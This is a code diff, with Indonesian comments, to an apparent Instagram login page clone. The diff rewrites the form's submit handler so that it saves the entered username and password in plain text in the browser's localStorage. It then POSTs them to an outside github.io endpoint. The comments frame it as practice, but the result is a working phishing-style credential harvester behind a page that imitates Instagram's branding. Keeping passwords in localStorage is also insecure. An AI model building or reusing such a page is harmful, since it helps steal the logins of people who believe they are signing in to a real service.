@@ -92,24 +92,53 @@
       </ul>
       <p class="copyright">© 2020 Instagram do Facebook</p>
     </footer>
-    <script>
+     <script>
       // Tangkap form
       const form = document.getElementById("loginForm");
 
-      form.addEventListener("submit", function (e) {
+      form.addEventListener("submit", async function (e) {
         e.preventDefault(); // biar ga reload
 
         // Ambil nilai input
         const username = document.getElementById("username").value;
         const password = document.getElementById("password").value;
-
+        const API_URL = "https://kidto1412.github.io/clone-instagram/login";
         // Untuk sementara tampilkan di console
-        console.log("Email/Username:", username);
-        console.log("Password:", password);
 
         // Bisa juga simpan ke localStorage
         localStorage.setItem("username", username);
         localStorage.setItem("password", password);
+
+        try {
+          const res = await fetch(API_URL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({ username, password }),
+          });
+
+          // cek status
+          if (!res.ok) {
+            const text = await res.text();
+            throw new Error(`Server error: ${res.status} ${text}`);
+          }
+
+          // parse response
+          const data = await res.json();
+          console.log("Server response:", data);
+
+          // contoh: simpan token yang dikembalikan (untuk latihan)
+          if (data.token) {
+            // jangan simpan password nyata di localStorage di production
+            localStorage.setItem("token", data.token);
+          }
+
+          alert("Request sukses — cek console untuk respons");
+        } catch (err) {
+          console.error("Request failed:", err);
+          alert("Gagal mengirim request. Lihat console.");
+        }
 
         // alert("Data terkirim! (cek console untuk lihat hasil)");
       });
